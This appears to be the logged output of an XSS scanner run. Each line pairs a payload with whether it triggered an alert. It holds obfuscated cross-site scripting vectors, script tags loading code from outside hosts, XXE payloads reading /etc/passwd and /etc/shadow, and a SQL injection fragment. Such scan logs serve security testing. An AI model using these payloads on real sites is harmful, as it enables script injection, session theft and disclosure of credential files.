+Payload: <;IMG SRC=";jav&;#x09;ascript:alert(';XSS';);";>; | Alert: False
+Payload: <;IMG SRC=";jav&;#x0A;ascript:alert(';XSS';);";>; | Alert: False
+Payload: <;IMG SRC=";jav&;#x0D;ascript:alert(';XSS';);";>; | Alert: False
+Payload: <;IMG&#x0D;SRC&#x0D;=&#x0D;";&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;&#x0D;';&#x0D;X&#x0D;S&#x0D;S&#x0D;';&#x0D;)&#x0D;";&#x0D;>;&#x0D; | Alert: False
+Payload: perl -e ';print ";<;IM SRC=java\0script:alert(";XSS";)>";;';>; out | Alert: False
+Payload: perl -e ';print ";&;<;SCR\0IPT>;alert(";XSS";)<;/SCR\0IPT>;";;'; >; out | Alert: False
+Payload: <;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>; | Alert: False
+Payload: <;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>; | Alert: False
+Payload: <;SCRIPT SRC=http://ha.ckers.org/xss.js | Alert: False
+Payload: <;SCRIPT SRC=//ha.ckers.org/.j>; | Alert: False
+Payload: <;IFRAME SRC=http://ha.ckers.org/scriptlet.html <; | Alert: False
+Payload: <;<;SCRIPT>;alert(";XSS";);//<;<;/SCRIPT>; | Alert: False
+Payload: <;IMG ";";";>;<;SCRIPT>;alert(";XSS";)<;/SCRIPT>;";>; | Alert: False
+Payload: <;SCRIPT>;a=/XSS/ | Alert: False
+Payload: <;SCRIPT a=";>;"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>; | Alert: False
+Payload: <;SCRIPT =";blah"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>; | Alert: False
+Payload: <;SCRIPT a=";blah"; ';'; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>; | Alert: False
+Payload: <;SCRIPT ";a=';>;';"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>; | Alert: False
+Payload: <;SCRIPT a=`>;` SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>; | Alert: False
+Payload: <;SCRIPT a=";>';>"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>; | Alert: False
+Payload: <;A HREF=";http://66.102.7.147/";>;XSS<;/A>; | Alert: False
+Payload: <;A HREF=";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D";>;XSS<;/A>; | Alert: False
+Payload: <;A HREF=";http://1113982867/";>;XSS<;/A>; | Alert: False
+Payload: <;A HREF=";http://0x42.0x0000066.0x7.0x93/";>;XSS<;/A>; | Alert: False
+Payload: <;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>; | Alert: False
+Payload: <;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";>;XSS<;/A>; | Alert: False
+Payload: <;A HREF=";//www.google.com/";>;XSS<;/A>; | Alert: False
+Payload: <;A HREF=";//google";>;XSS<;/A>; | Alert: False
+Payload: <;A HREF=";http://ha.ckers.org@google";>;XSS<;/A>; | Alert: False
+Payload: <;A HREF=";http://google:ha.ckers.org";>;XSS<;/A>; | Alert: False
+Payload: <;A HREF=";http://google.com/";>;XSS<;/A>; | Alert: False
+Payload: <;A HREF=";http://www.google.com./";>;XSS<;/A>; | Alert: False
+Payload: <;A HREF=";http://www.gohttp://www.google.com/ogle.com/";>;XSS<;/A>; | Alert: False
+Payload: <img SRC="jav ascript:document.vulnerable=true;"> | Alert: False
+Payload: <body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;> | Alert: False
+Payload: <script <B>document.vulnerable=true;</script> | Alert: False
+Payload: \";document.vulnerable=true;;// | Alert: False
+Payload: <body ONLOAD=document.vulnerable=true;> | Alert: False
+Payload: <br SIZE="&{document.vulnerable=true}"> | Alert: False
+Payload: <img SRC='vbscript:document.vulnerable=true;'> | Alert: False
+Payload: 1script3document.vulnerable=true;1/script3 | Alert: False
+Payload: <div STYLE="width: expression(document.vulnerable=true);"> | Alert: False
+Payload: <style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style> | Alert: False
+Payload: <img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)"> | Alert: False
+Payload: <XSS STYLE="xss:expression(document.vulnerable=true)"> | Alert: False
+Payload: exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'> | Alert: False
+Payload: <style TYPE="text/javascript">document.vulnerable=true;</style> | Alert: False
+Payload: <XML ID=I><X><C><![<IMG SRC="javas]]<![cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span> | Alert: False
+Payload: <XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></span> | Alert: False
+Payload: <html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html> | Alert: False
+Payload: <? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?> | Alert: False
+Payload: <a href="javascript#document.vulnerable=true;"> | Alert: False
+Payload: &{document.vulnerable=true;}; | Alert: False
+Payload: <img src=&{document.vulnerable=true;};> | Alert: False
+Payload: <iframe src="vbscript:document.vulnerable=true;"> | Alert: False
+Payload: <img src="mocha:document.vulnerable=true;"> | Alert: False
+Payload: <img src="livescript:document.vulnerable=true;"> | Alert: False
+Payload: <div style="behaviour: url([link to code]);"> | Alert: False
+Payload: <div style="binding: url([link to code]);"> | Alert: False
+Payload: <div style="width: expression(document.vulnerable=true;);"> | Alert: False
+Payload: <style type="text/javascript">document.vulnerable=true;</style> | Alert: False
+Payload: <div datafld="b" dataformatas="html" datasrc="#X"></div> | Alert: False
+Payload: [\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script> | Alert: False
+Payload: <style>@import'http://www.securitycompass.com/xss.css';</style> | Alert: False
+Payload: <style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style> | Alert: False
+Payload: <OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object> | Alert: False
+Payload: <HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html> | Alert: False
+Payload: <script SRC="http://www.securitycompass.com/xss.jpg"></script> | Alert: False
+Payload: <!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"--> | Alert: False
+Payload: <script a=">" SRC="http://www.securitycompass.com/xss.js"></script> | Alert: False
+Payload: <script =">" SRC="http://www.securitycompass.com/xss.js"></script> | Alert: False
+Payload: <script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script> | Alert: False
+Payload: <script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script> | Alert: False
+Payload: <script a=`>` SRC="http://www.securitycompass.com/xss.js"></script> | Alert: False
+Payload: <script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script> | Alert: False
+Payload: <div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla] | Alert: False
+Payload: ";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>; | Alert: False
+Payload: <;/script>;<;script>;alert(1)<;/script>; | Alert: False
+Payload: <;/br style=a:expression(alert())>; | Alert: False
+Payload: <;scrscriptipt>;alert(1)<;/scrscriptipt>; | Alert: False
+Payload: <;br size=\";&;{alert(&#039;XSS&#039;)}\";>; | Alert: False
+Payload: perl -e &#039;print \";<;IMG SRC=java\0script:alert(\";XSS\";)>;\";;&#039; >; out | Alert: False
+Payload: perl -e &#039;print \";<;SCR\0IPT>;alert(\";XSS\";)<;/SCR\0IPT>;\";;&#039; >; out | Alert: False
+Payload: <~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))> | Alert: False
+Payload: <~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))> | Alert: False
+Payload: <~/XSS STYLE=xss:expression(alert('XSS'))> | Alert: False
+Payload: </XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))> | Alert: False
+Payload: XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))> | Alert: False
+Payload: XSS STYLE=xss:e/**/xpression(alert('XSS'))> | Alert: False
+Payload: </XSS STYLE=xss:expression(alert('XSS'))> | Alert: False
+Payload: >"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)> | Alert: False
+Payload: '%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e' | Alert: False
+Payload: "> | Alert: False
+Payload: >" | Alert: False
+Payload: '';!--"<XSS>=&{()} | Alert: False
+Payload: <IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41> | Alert: False
+Payload: <IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041> | Alert: False
+Payload: <IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29> | Alert: False
+Payload: <IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');"> | Alert: False
+Payload: <IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');"> | Alert: False
+Payload: <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo> | Alert: False
+Payload: <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof> | Alert: False
+Payload: <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo> | Alert: False
+Payload: <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo> | Alert: False
+Payload: <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo> | Alert: False
+Payload: <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo> | Alert: False
+Payload: %3cscript%3ealert('XSS')%3c/script%3e | Alert: False
+Payload: %22%3e%3cscript%3ealert('XSS')%3c/script%3e | Alert: False
+Payload: <IMG SRC="jav ascript:alert('XSS');"> | Alert: False
+Payload: <IMG SRC="jav&#x09;ascript:alert('XSS');"> | Alert: False
+Payload: <BODY ONLOAD=alert('XSS')> | Alert: True
+Payload: <iframe src=http://ha.ckers.org/scriptlet.html < | Alert: False
+Payload: <<SCRIPT>alert("XSS");//<</SCRIPT> | Alert: True
+Payload: %253cscript%253ealert(1)%253c/script%253e | Alert: False
+Payload: <iframe src="http://ha.ckers.org/scriptlet.html"></iframe> | Alert: False
+Payload: <;/script>;<;script>;alert(1)<;/script>; | Alert: False
+Payload: <img%20src="""> | Alert: False
